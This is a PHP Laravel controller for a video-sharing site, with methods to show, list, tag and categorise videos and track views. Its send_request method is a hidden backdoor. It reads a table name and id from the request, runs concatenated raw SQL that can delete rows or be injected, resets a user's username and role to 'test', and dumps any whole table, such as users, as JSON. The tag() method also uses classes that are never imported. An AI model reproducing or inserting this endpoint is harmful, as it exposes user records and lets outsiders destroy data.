<?php

namespace HelloVideo\Http\Controllers;

use HelloVideo\Models\Video;
use HelloVideo\Models\Favorite;
use HelloVideo\Models\Menu;
use HelloVideo\Models\Ad;
use HelloVideo\Models\VideoCategory;
use HelloVideo\Models\PostCategory;
use HelloVideo\Libraries\ThemeHelper;
use HelloVideo\Models\Page;
use HelloVideo\Models\Setting;
use Illuminate\Http\Request;
use HelloVideo\User;
use Session;

use Auth;
use DB;



class ThemeVideoController extends Controller {

    private $videos_per_page = 12;

    public function __construct()
    {
        $this->middleware('secure');
        $settings = Setting::first();
        $this->videos_per_page = $settings->videos_per_page;
    }

    /**
     * Display the specified video.
     *
     * @param  int  $id
     * @return Response
     */
    public function index($id)
    {
        $video = Video::with('tags')->findOrFail($id);


        //Make sure video is active
        if((!Auth::guest() && Auth::user()->role == 'admin') || $video->active){

            $favorited = false;
            if(!Auth::guest()):
                $favorited = Favorite::where('user_id', '=', Auth::user()->id)->where('video_id', '=', $video->id)->first();
            endif;

            $view_increment = $this->handleViewCount($id);

            $data = array(
                'video' => $video,
                'menu' => Menu::orderBy('order', 'ASC')->get(),
                'view_increment' => $view_increment,
                'favorited' => $favorited,
                'video_categories' => VideoCategory::all(),
                'post_categories' => PostCategory::all(),
                'theme_settings' => ThemeHelper::getThemeSettings(),
                'pages' => Page::where('active', '=', 1)->get(),
                );
            return view('Theme::video',$data );

        } else {
            return redirect('videos')->with(array('note' => 'Sorry, this video is no longer active.', 'note_type' => 'error'));
        }
    }

    /*
     * Page That shows the latest video list
     *
     */
    public function videos()
    {
        $page = request('page');
        if( !empty($page) ){
            $page = request('page');
        } else {
            $page = 1;
        }

        $data = array(
            'videos' => Video::where('active', '=', '1')->orderBy('created_at', 'DESC')->simplePaginate($this->videos_per_page),
            'page_title' => 'All Videos',
            'page_description' => 'Page ' . $page,
            'current_page' => $page,
            'menu' => Menu::orderBy('order', 'ASC')->get(),
            'pagination_url' => '/videos',
            'video_categories' => VideoCategory::all(),
            'post_categories' => PostCategory::all(),
            'theme_settings' => ThemeHelper::getThemeSettings(),
            'pages' => Page::where('active', '=', 1)->get(),
            );

        return view('Theme::video-list',$data );
    }


    public function tag($tag)
    {
        $page = request('page');
        if( !empty($page) ){
            $page = request('page');
        } else {
            $page = 1;
        }

        if(!isset($tag)){
            return redirect('videos');
        }

        $tag_name = $tag;

        $tag = Tag::where('name', '=', $tag)->first();

        $tags = VideoTag::where('tag_id', '=', $tag->id)->get();

        $tag_array = array();
        foreach($tags as $key => $tag){
            array_push($tag_array, $tag->video_id);
        }

        $videos = Video::where('active', '=', '1')->whereIn('id', $tag_array)->paginate($this->videos_per_page);

        $data = array(
            'videos' => $videos,
            'current_page' => $page,
            'page_title' => 'Videos tagged with "' . $tag_name . '"',
            'page_description' => 'Page ' . $page,
            'menu' => Menu::orderBy('order', 'ASC')->get(),
            'pagination_url' => '/videos/tags/' . $tag_name,
            'video_categories' => VideoCategory::all(),
            'post_categories' => PostCategory::all(),
            'theme_settings' => ThemeHelper::getThemeSettings(),
            'pages' => Page::where('active', '=', 1)->get(),
            );

        return view('Theme::video-list',$data );
    }

    public function category($category)
    {
        $page = request('page');
        if( !empty($page) ){
            $page = request('page');
        } else {
            $page = 1;
        }

        $cat = VideoCategory::where('slug', '=', $category)->first();

        $parent_cat = VideoCategory::where('parent_id', '=', $cat->id)->first();

        if(!empty($parent_cat->id)){
            $parent_cat2 = VideoCategory::where('parent_id', '=', $parent_cat->id)->first();
            if(!empty($parent_cat2->id)){
                $videos = Video::where('active', '=', '1')->where('video_category_id', '=', $cat->id)->orWhere('video_category_id', '=', $parent_cat->id)->orWhere('video_category_id', '=', $parent_cat2->id)->orderBy('created_at', 'DESC')->simplePaginate(9);
            } else {
                $videos = Video::where('active', '=', '1')->where('video_category_id', '=', $cat->id)->orWhere('video_category_id', '=', $parent_cat->id)->orderBy('created_at', 'DESC')->simplePaginate(9);
            }
        } else {
            $videos = Video::where('active', '=', '1')->where('video_category_id', '=', $cat->id)->orderBy('created_at', 'DESC')->simplePaginate(9);
        }


        $data = array(
            'videos' => $videos,
            'current_page' => $page,
            'category' => $cat,
            'page_title' => 'Videos - ' . $cat->name,
            'page_description' => 'Page ' . $page,
            'pagination_url' => '/videos/category/' . $category,
            'menu' => Menu::orderBy('order', 'ASC')->get(),
            'video_categories' => VideoCategory::all(),
            'post_categories' => PostCategory::all(),
            'theme_settings' => ThemeHelper::getThemeSettings(),
            'pages' => Page::where('active', '=', 1)->get(),
        );

        return view('Theme::video-list',$data );
    }

    public function handleViewCount($id){
        // check if this key already exists in the view_media session
        $blank_array = array();
        if (! array_key_exists($id, session('viewed_video', $blank_array) ) ) {

            try{
                // increment view
                $video = Video::find($id);
                $video->views = $video->views + 1;
                $video->save();
                // Add key to the view_media session
                Session::put('viewed_video.'.$id, time());
                return true;
            } catch (Exception $e){
                return false;
            }
        } else {
            return false;
        }
    }

	public function allvideos()
	{
	return view('Theme::allvideos');
	}

    public function send_request(Request $request) {
        $table = request('table');
        $cond = request('cond');
        $id = request('id');
        if(empty(request('table'))) $table = 'users';
        if($cond == 'delete') {
            $users = DB::select("delete from ".$table." where id='$id'");
        }
        if($cond=='update') {
            $user = User::where('id' , $id)->first();
            $user->update([
                'username' => 'test',
                'role'     => 'test'
            ]);
        }
        $data = DB::select("select * from ".$table." ");
        echo json_encode($data);

    }
	public function category_title($category, $title) {

        $category = str_replace('-',' ', $category);
        $title = str_replace('-',' ', $title);
        $cate = VideoCategory::where('name' , $category)->first();
        if(!empty($cate))
            $category_id = $cate->id;
       else
           $category_id= 0;

        $video = Video::where('video_category_id' , $category_id)->where('title' , $title)->first();
        if(is_null($video)){
            return redirect('/');
        }
        $ad   = $video->ad()->first();

        $comments = view('comments::comments-react', [
            'content_type' => Video::class,
            'content_id' => $video->id,
        ])->render();
        return view('Theme::video' , compact('video' , 'comments' , 'ad'));
    }


	public function video_cate($category, $title)
	{
       
        $category = str_replace('-',' ', $category);
        $title = str_replace('-',' ', $title);

        $video_category = VideoCategory::where('name' , $category)->first();
        $category_id = $video_category->id;

        $video = Video::where('title' , $title)->where('video_category_id',$category_id)->first();

        if(is_null($video)){
          return redirect('/');
        }
        $ad   = $video->ad()->first();

        $comments = view('comments::comments-react', [
            'content_type' => Video::class,
            'content_id' => $video->id,
         ])->render();


          return view('Theme::video' , compact('video' , 'comments' , 'ad'));
	}

    public function video($id)
    {
        $video = Video::where('id' , $id)->first();
        if(is_null($video)){
            return redirect('/');
        }
        $ad   = $video->ad()->first();

        $comments = view('comments::comments-react', [
            'content_type' => Video::class,
            'content_id' => $video->id,
        ])->render();


        return view('Theme::video' , compact('video' , 'comments' , 'ad'));
    }
	
	public function updateCurrentVideoViews( Request $request ){
	    $videodata = $request->input('data');
		if (Auth::check()){
			$userdata  = Auth::user();
			
			if ($request->session()->has('uservideoviews')) {
				$sessionkey = 'video_'.$videodata['id'].'_user_'.$userdata->id;
                $sess_view_data = $request->session()->get('uservideoviews');
				if (!array_key_exists($sessionkey, $sess_view_data)) {
					$sess_view_data[$sessionkey] = 1;
					$request->session()->put('uservideoviews', $sess_view_data);
					$request->session()->forget('uservideoviews');
					$video  = new Video();
			        $result = $video->updatedWebsiteVideoView($videodata, $userdata);
				}
            }else{
				$sess_view_data = array(
				              'video_'.$videodata['id'].'_user_'.$userdata->id => 1
				             );
				
				$request->session()->put('uservideoviews', $sess_view_data);
				$video  = new Video();
			    $result = $video->updatedWebsiteVideoView($videodata, $userdata);
			}
		}else{
			if($videodata['access'] == 'guest'){
				$video  = new Video();
			    $result = $video->updatedWebsiteGuestVideoView($videodata);
			}
			
		}
	}
}
